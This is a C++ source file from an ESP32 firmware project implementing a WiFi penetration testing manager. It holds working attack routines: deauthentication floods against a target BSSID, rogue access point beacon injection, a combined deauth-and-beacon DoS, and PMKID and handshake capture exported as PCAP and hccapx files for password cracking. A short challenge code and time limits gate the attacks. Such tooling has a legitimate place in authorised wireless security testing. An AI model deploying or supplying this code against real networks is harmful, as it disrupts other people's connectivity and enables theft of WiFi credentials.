// Copyright 2025 XiaoZhi ESP32 Project
// WiFi Penetration Testing Manager Implementation

#include "wifi_pentest_manager.h"

#include <algorithm>
#include <cstring>
#include <iomanip>
#include <sstream>

#include "esp_log.h"
#include "esp_random.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/semphr.h"

#include "wifi_frame_injector.h"
#include "wifi_packet_analyzer.h"
#include "capture_formats/pcap_writer.h"
#include "wifi_manager.h"
#include "capture_formats/hccapx_writer.h"
#include "wifi_coordinator.h"

static const char* TAG = "WifiPentest";

namespace xiaozhi {

// AuthorizationManager implementation
AuthorizationManager::AuthorizationManager() {}

std::string AuthorizationManager::GenerateChallenge() {
  // Generate 8-digit hex code
  uint32_t random = esp_random();
  
  std::stringstream ss;
  ss << std::hex << std::setfill('0') << std::setw(8) << random;
  
  current_challenge_ = ss.str();
  std::transform(current_challenge_.begin(), current_challenge_.end(),
                 current_challenge_.begin(), ::toupper);
  
  challenge_timestamp_us_ = esp_timer_get_time();
  authorized_ = false;
  
  ESP_LOGI(TAG, "Authorization challenge generated: %s", current_challenge_.c_str());
  return current_challenge_;
}

bool AuthorizationManager::Verify(const std::string& code) {
  if (current_challenge_.empty()) {
    ESP_LOGW(TAG, "No challenge active");
    return false;
  }
  
  // Check timeout
  int64_t elapsed = esp_timer_get_time() - challenge_timestamp_us_;
  if (elapsed > TIMEOUT_US) {
    ESP_LOGW(TAG, "Authorization timeout");
    Clear();
    return false;
  }
  
  // Case-insensitive compare
  std::string code_upper = code;
  std::transform(code_upper.begin(), code_upper.end(),
                 code_upper.begin(), ::toupper);
  
  if (code_upper == current_challenge_) {
    authorized_ = true;
    ESP_LOGI(TAG, "Authorization successful");
    return true;
  }
  
  ESP_LOGW(TAG, "Authorization failed: incorrect code");
  return false;
}

bool AuthorizationManager::IsAuthorized() const {
  if (!authorized_) return false;
  
  // Check if still within timeout
  int64_t elapsed = esp_timer_get_time() - challenge_timestamp_us_;
  return elapsed <= TIMEOUT_US;
}

void AuthorizationManager::Clear() {
  current_challenge_.clear();
  challenge_timestamp_us_ = 0;
  authorized_ = false;
}

// WifiPentestManager implementation
WifiPentestManager& WifiPentestManager::GetInstance() {
  static WifiPentestManager instance;
  return instance;
}

WifiPentestManager::WifiPentestManager() {
  mutex_ = xSemaphoreCreateMutex();
}

WifiPentestManager::~WifiPentestManager() {
  Shutdown();
  if (mutex_) {
    vSemaphoreDelete(mutex_);
  }
}

esp_err_t WifiPentestManager::Initialize() {
  if (initialized_) {
    return ESP_OK;
  }

  ESP_LOGI(TAG, "Initializing WiFi Penetration Testing Manager");

  // Request exclusive pentest mode from coordinator
  auto& coordinator = WifiCoordinator::GetInstance();
  if (!coordinator.RequestPentestMode()) {
    ESP_LOGE(TAG, "Cannot acquire pentest mode - blocked by %s mode",
             coordinator.GetCurrentModeString());
    ESP_LOGE(TAG, "Stop other WiFi operations before starting pentest");
    return ESP_ERR_INVALID_STATE;
  }

  // Ensure BLE is fully stopped (critical for radio coexistence)
  esp_err_t ret = coordinator.EnsureBleStoppedForPentest();
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to stop BLE for pentest: %s", esp_err_to_name(ret));
    coordinator.ReleaseMode(WifiMode::PENTEST);
    return ret;
  }

  // Now safe to initialize pentest components
  injector_ = std::make_unique<WifiFrameInjector>();
  ret = injector_->Initialize();
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to initialize frame injector: %s", esp_err_to_name(ret));
    coordinator.ReleaseMode(WifiMode::PENTEST);
    return ret;
  }

  analyzer_ = std::make_unique<WifiPacketAnalyzer>();
  ret = analyzer_->Initialize();
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to initialize packet analyzer: %s", esp_err_to_name(ret));
    injector_->Shutdown();
    injector_.reset();
    coordinator.ReleaseMode(WifiMode::PENTEST);
    return ret;
  }

  initialized_ = true;
  state_ = PentestState::IDLE;

  ESP_LOGI(TAG, "WiFi Pentest Manager initialized in exclusive mode");
  return ESP_OK;
}

void WifiPentestManager::Shutdown() {
  if (!initialized_) return;

  ESP_LOGI(TAG, "Shutting down WiFi Pentest Manager");

  // Stop any active attack
  AbortAttack();

  // Cleanup components
  if (analyzer_) {
    analyzer_->Shutdown();
    analyzer_.reset();
  }

  if (injector_) {
    injector_->Shutdown();
    injector_.reset();
  }

  // Release exclusive pentest mode
  WifiCoordinator::GetInstance().ReleaseMode(WifiMode::PENTEST);

  initialized_ = false;
  state_ = PentestState::IDLE;

  ESP_LOGI(TAG, "WiFi Pentest Manager shutdown complete - pentest mode released");
}

std::vector<ScanResult> WifiPentestManager::ScanNetworks() {
  ESP_LOGI(TAG, "Scanning WiFi networks...");

  std::vector<ScanResult> results;

  // Pause auto-reconnect to prevent scan interruption
  auto& wifi_manager = WifiManager::GetInstance();
  wifi_manager.PauseScan();

  // Use ESP32 WiFi scan
  wifi_scan_config_t scan_config = {};
  scan_config.show_hidden = true;

  esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "WiFi scan failed: %s", esp_err_to_name(ret));
    wifi_manager.ResumeScan();  // Resume even on error
    return results;
  }

  uint16_t ap_count = 0;
  esp_wifi_scan_get_ap_num(&ap_count);

  if (ap_count == 0) {
    ESP_LOGI(TAG, "No networks found");
    wifi_manager.ResumeScan();
    return results;
  }

  wifi_ap_record_t* ap_records = new wifi_ap_record_t[ap_count];
  esp_wifi_scan_get_ap_records(&ap_count, ap_records);

  for (int i = 0; i < ap_count; i++) {
    ScanResult result;
    result.ssid = std::string((char*)ap_records[i].ssid);
    std::memcpy(result.bssid, ap_records[i].bssid, 6);
    result.channel = ap_records[i].primary;
    result.rssi = ap_records[i].rssi;
    result.auth_mode = ap_records[i].authmode;
    results.push_back(result);
  }

  delete[] ap_records;

  // Resume auto-reconnect
  wifi_manager.ResumeScan();

  ESP_LOGI(TAG, "Scan complete: %d networks found", ap_count);
  return results;
}

std::string WifiPentestManager::RequestAuthorization() {
  return auth_manager_.GenerateChallenge();
}

bool WifiPentestManager::VerifyAuthorization(const std::string& code) {
  return auth_manager_.Verify(code);
}

bool WifiPentestManager::ValidateConfig(const AttackConfig& config) {
  // Check authorization
  if (!auth_manager_.IsAuthorized()) {
    ESP_LOGE(TAG, "Not authorized");
    return false;
  }
  
  // Validate attack type
  if (config.type == AttackType::NONE) {
    ESP_LOGE(TAG, "Invalid attack type");
    return false;
  }
  
  // Validate duration
  if (config.duration_seconds < MIN_DURATION_SEC ||
      config.duration_seconds > MAX_DURATION_SEC) {
    ESP_LOGE(TAG, "Invalid duration: %lu (must be %lu-%lu)",
             config.duration_seconds, MIN_DURATION_SEC, MAX_DURATION_SEC);
    return false;
  }
  
  // Validate frame rate
  if (config.frame_rate < MIN_FRAME_RATE ||
      config.frame_rate > MAX_FRAME_RATE) {
    ESP_LOGE(TAG, "Invalid frame rate: %lu (must be %lu-%lu)",
             config.frame_rate, MIN_FRAME_RATE, MAX_FRAME_RATE);
    return false;
  }
  
  // Validate channel (1-13 for most regions)
  if (config.channel != 0 && (config.channel < 1 || config.channel > 13)) {
    ESP_LOGE(TAG, "Invalid channel: %d", config.channel);
    return false;
  }
  
  // Validate BSSID (non-zero for most attacks)
  if (config.type != AttackType::DOS) {
    bool bssid_valid = false;
    for (int i = 0; i < 6; i++) {
      if (config.target_bssid[i] != 0) {
        bssid_valid = true;
        break;
      }
    }
    if (!bssid_valid) {
      ESP_LOGE(TAG, "Invalid BSSID (all zeros)");
      return false;
    }
  }
  
  return true;
}

esp_err_t WifiPentestManager::StartAttack(const AttackConfig& config) {
  if (!initialized_) {
    ESP_LOGE(TAG, "Not initialized");
    return ESP_ERR_INVALID_STATE;
  }
  
  // Check state
  PentestState current_state = state_.load();
  if (current_state != PentestState::IDLE) {
    ESP_LOGE(TAG, "Attack already running (state: %s)", GetStateString().c_str());
    return ESP_ERR_INVALID_STATE;
  }
  
  // Validate configuration
  if (!ValidateConfig(config)) {
    return ESP_ERR_INVALID_ARG;
  }
  
  // Store config
  xSemaphoreTake(mutex_, portMAX_DELAY);
  current_config_ = config;
  current_attack_type_ = config.type;
  current_stats_ = AttackStats{};
  abort_requested_ = false;
  xSemaphoreGive(mutex_);
  
  // Set frame rate
  injector_->SetFrameRate(config.frame_rate);
  
  // Log attack start
  char bssid_str[18];
  snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
           config.target_bssid[0], config.target_bssid[1], config.target_bssid[2],
           config.target_bssid[3], config.target_bssid[4], config.target_bssid[5]);
  
  ESP_LOGW(TAG, "Starting %s attack on BSSID %s, channel %d, duration %lu sec",
           config.type == AttackType::DEAUTH ? "DEAUTH" :
           config.type == AttackType::ROGUE_AP ? "ROGUE AP" :
           config.type == AttackType::PMKID_CAPTURE ? "PMKID" : "DOS",
           bssid_str, config.channel, config.duration_seconds);
  
  // Create attack task
  BaseType_t ret = xTaskCreate(
      AttackTaskTrampoline,
      "wifi_pentest_attack",
      4096,
      this,
      5,
      &attack_task_handle_
  );
  
  if (ret != pdPASS) {
    ESP_LOGE(TAG, "Failed to create attack task");
    state_ = PentestState::ERROR;
    return ESP_FAIL;
  }
  
  state_ = PentestState::RUNNING;
  attack_start_time_us_ = esp_timer_get_time();
  
  return ESP_OK;
}

esp_err_t WifiPentestManager::StopAttack() {
  return AbortAttack();
}

esp_err_t WifiPentestManager::AbortAttack() {
  PentestState current_state = state_.load();
  if (current_state != PentestState::RUNNING) {
    return ESP_OK;  // Nothing to abort
  }
  
  ESP_LOGI(TAG, "Aborting attack...");
  abort_requested_ = true;
  
  // Wait for task to finish (max 5 seconds)
  for (int i = 0; i < 50 && attack_task_handle_ != nullptr; i++) {
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  
  if (attack_task_handle_ != nullptr) {
    ESP_LOGW(TAG, "Attack task did not stop gracefully, force deleting");
    vTaskDelete(attack_task_handle_);
    attack_task_handle_ = nullptr;
  }
  
  CleanupAttack();
  state_ = PentestState::ABORTED;
  
  ESP_LOGI(TAG, "Attack aborted");
  return ESP_OK;
}

void WifiPentestManager::AttackTaskTrampoline(void* param) {
  WifiPentestManager* manager = static_cast<WifiPentestManager*>(param);
  manager->AttackTask();
}

void WifiPentestManager::AttackTask() {
  ESP_LOGI(TAG, "Attack task started");
  
  try {
    switch (current_attack_type_) {
      case AttackType::DEAUTH:
        ExecuteDeauthAttack();
        break;
      case AttackType::ROGUE_AP:
        ExecuteRogueApAttack();
        break;
      case AttackType::PMKID_CAPTURE:
        ExecutePmkidCapture();
        break;
      case AttackType::DOS:
        ExecuteDosAttack();
        break;
      default:
        ESP_LOGE(TAG, "Unknown attack type");
        state_ = PentestState::ERROR;
        break;
    }
  } catch (const std::exception& e) {
    ESP_LOGE(TAG, "Attack exception: %s", e.what());
    state_ = PentestState::ERROR;
  }
  
  CleanupAttack();
  
  // Determine final state
  if (state_ == PentestState::RUNNING) {
    state_ = PentestState::FINISHED;
  }
  
  ESP_LOGI(TAG, "Attack task finished (state: %s)", GetStateString().c_str());
  attack_task_handle_ = nullptr;
  vTaskDelete(nullptr);
}

void WifiPentestManager::ExecuteDeauthAttack() {
  ESP_LOGI(TAG, "Executing deauth attack");
  
  // Set channel
  injector_->SetChannel(current_config_.channel);
  
  const int64_t duration_us = current_config_.duration_seconds * 1000000LL;
  
  while (!abort_requested_) {
    // Check timeout
    int64_t elapsed = esp_timer_get_time() - attack_start_time_us_;
    if (elapsed >= duration_us) {
      state_ = PentestState::TIMEOUT;
      break;
    }
    
    // Send deauth frame (broadcast to all clients)
    esp_err_t ret = injector_->InjectDeauthFrame(current_config_.target_bssid, nullptr);
    if (ret == ESP_OK) {
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.frames_sent++;
      xSemaphoreGive(mutex_);
    } else {
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.errors++;
      xSemaphoreGive(mutex_);
    }
    
    // Rate limiting handled by injector
    vTaskDelay(1);
  }
  
  UpdateStats();
}

void WifiPentestManager::ExecuteRogueApAttack() {
  ESP_LOGI(TAG, "Executing rogue AP attack");
  
  // Set channel
  injector_->SetChannel(current_config_.channel);
  
  // Start packet capture
  analyzer_->StartCapture(current_config_.channel);
  
  const int64_t duration_us = current_config_.duration_seconds * 1000000LL;
  
  while (!abort_requested_) {
    // Check timeout
    int64_t elapsed = esp_timer_get_time() - attack_start_time_us_;
    if (elapsed >= duration_us) {
      state_ = PentestState::TIMEOUT;
      break;
    }
    
    // Send beacon frames to advertise fake AP
    esp_err_t ret = injector_->InjectBeaconFrame(
        current_config_.target_bssid,
        current_config_.target_ssid.c_str(),
        current_config_.channel
    );
    
    if (ret == ESP_OK) {
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.frames_sent++;
      xSemaphoreGive(mutex_);
    } else {
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.errors++;
      xSemaphoreGive(mutex_);
    }
    
    // Check for handshake
    if (analyzer_->HasCompleteHandshake(current_config_.target_bssid)) {
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.handshakes_captured++;
      xSemaphoreGive(mutex_);
      ESP_LOGI(TAG, "Handshake captured!");
    }
    
    vTaskDelay(pdMS_TO_TICKS(100));  // Beacons every 100ms
  }
  
  analyzer_->StopCapture();
  UpdateStats();
}

void WifiPentestManager::ExecutePmkidCapture() {
  ESP_LOGI(TAG, "Executing PMKID capture");
  
  // Start packet capture on target channel
  analyzer_->StartCapture(current_config_.channel);
  
  const int64_t duration_us = current_config_.duration_seconds * 1000000LL;
  
  while (!abort_requested_) {
    // Check timeout
    int64_t elapsed = esp_timer_get_time() - attack_start_time_us_;
    if (elapsed >= duration_us) {
      state_ = PentestState::TIMEOUT;
      break;
    }
    
    // Check for PMKID
    if (analyzer_->HasPmkid()) {
      PmkidCapture pmkid = analyzer_->GetPmkid();
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.pmkid_found = true;
      
      // Convert to hex string
      std::stringstream ss;
      for (int i = 0; i < 16; i++) {
        ss << std::hex << std::setfill('0') << std::setw(2) << (int)pmkid.pmkid[i];
      }
      current_stats_.pmkid = ss.str();
      
      xSemaphoreGive(mutex_);
      ESP_LOGI(TAG, "PMKID captured: %s", current_stats_.pmkid.c_str());
      break;  // Success, exit early
    }
    
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  
  analyzer_->StopCapture();
  UpdateStats();
}

void WifiPentestManager::ExecuteDosAttack() {
  ESP_LOGI(TAG, "Executing combined DoS attack");
  
  // Set channel
  injector_->SetChannel(current_config_.channel);
  
  const int64_t duration_us = current_config_.duration_seconds * 1000000LL;
  int frame_counter = 0;
  
  while (!abort_requested_) {
    // Check timeout
    int64_t elapsed = esp_timer_get_time() - attack_start_time_us_;
    if (elapsed >= duration_us) {
      state_ = PentestState::TIMEOUT;
      break;
    }
    
    esp_err_t ret;
    
    // Alternate between deauth and beacon flood
    if (frame_counter % 10 < 7) {
      // Deauth (70% of frames)
      ret = injector_->InjectDeauthFrame(current_config_.target_bssid, nullptr);
    } else {
      // Beacon flood (30% of frames)
      ret = injector_->InjectBeaconFrame(
          current_config_.target_bssid,
          current_config_.target_ssid.c_str(),
          current_config_.channel
      );
    }
    
    if (ret == ESP_OK) {
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.frames_sent++;
      xSemaphoreGive(mutex_);
    } else {
      xSemaphoreTake(mutex_, portMAX_DELAY);
      current_stats_.errors++;
      xSemaphoreGive(mutex_);
    }
    
    frame_counter++;
    vTaskDelay(1);
  }
  
  UpdateStats();
}

void WifiPentestManager::UpdateStats() {
  xSemaphoreTake(mutex_, portMAX_DELAY);
  
  int64_t elapsed = esp_timer_get_time() - attack_start_time_us_;
  current_stats_.elapsed_seconds = elapsed / 1000000;
  
  if (analyzer_ && analyzer_->IsInitialized()) {
    current_stats_.packets_captured = analyzer_->GetPacketsCaptured();
  }
  
  xSemaphoreGive(mutex_);
}

void WifiPentestManager::CleanupAttack() {
  // Stop any ongoing operations
  if (analyzer_ && analyzer_->IsCapturing()) {
    analyzer_->StopCapture();
  }
  
  // Clear authorization (one-time use)
  auth_manager_.Clear();
}

AttackStats WifiPentestManager::GetStats() const {
  xSemaphoreTake(mutex_, portMAX_DELAY);
  AttackStats stats = current_stats_;
  xSemaphoreGive(mutex_);
  return stats;
}

std::string WifiPentestManager::GetStateString() const {
  switch (state_.load()) {
    case PentestState::IDLE: return "IDLE";
    case PentestState::READY: return "READY";
    case PentestState::RUNNING: return "RUNNING";
    case PentestState::FINISHED: return "FINISHED";
    case PentestState::TIMEOUT: return "TIMEOUT";
    case PentestState::ERROR: return "ERROR";
    case PentestState::ABORTED: return "ABORTED";
    default: return "UNKNOWN";
  }
}

std::vector<uint8_t> WifiPentestManager::ExportPcap() const {
  if (!analyzer_ || analyzer_->GetPacketCount() == 0) {
    ESP_LOGW(TAG, "No packets captured");
    return {};
  }

  ESP_LOGI(TAG, "Exporting PCAP (%lu packets)", analyzer_->GetPacketCount());

  PcapWriter writer;

  // Add all captured packets
  std::vector<CapturedPacket> packets = analyzer_->GetCapturedPackets();
  for (const auto& packet : packets) {
    writer.AddPacket(packet);
  }

  std::vector<uint8_t> result = writer.Export();
  ESP_LOGI(TAG, "PCAP export complete: %d bytes", result.size());

  return result;
}

std::vector<uint8_t> WifiPentestManager::ExportHccapx() const {
  if (!analyzer_) {
    ESP_LOGW(TAG, "Analyzer not available");
    return {};
  }

  HccapxWriter writer;
  bool success = false;

  // Check for handshake
  if (analyzer_->HasCompleteHandshake()) {
    HandshakeCapture handshake = analyzer_->GetHandshake();
    success = writer.WriteHandshake(handshake);
    if (success) {
      ESP_LOGI(TAG, "Exporting HCCAPX handshake");
    }
  }
  // Check for PMKID
  else if (analyzer_->HasPmkid()) {
    PmkidCapture pmkid = analyzer_->GetPmkid();
    success = writer.WritePmkid(pmkid);
    if (success) {
      ESP_LOGI(TAG, "Exporting HCCAPX PMKID");
    }
  }

  if (!success) {
    ESP_LOGW(TAG, "No handshake or PMKID to export");
    return {};
  }

  std::vector<uint8_t> result = writer.Export();
  ESP_LOGI(TAG, "HCCAPX export complete: %d bytes", result.size());

  return result;
}

size_t WifiPentestManager::GetCaptureSize() const {
  if (analyzer_) {
    return analyzer_->GetPacketCount();
  }
  return 0;
}

}  // namespace xiaozhi
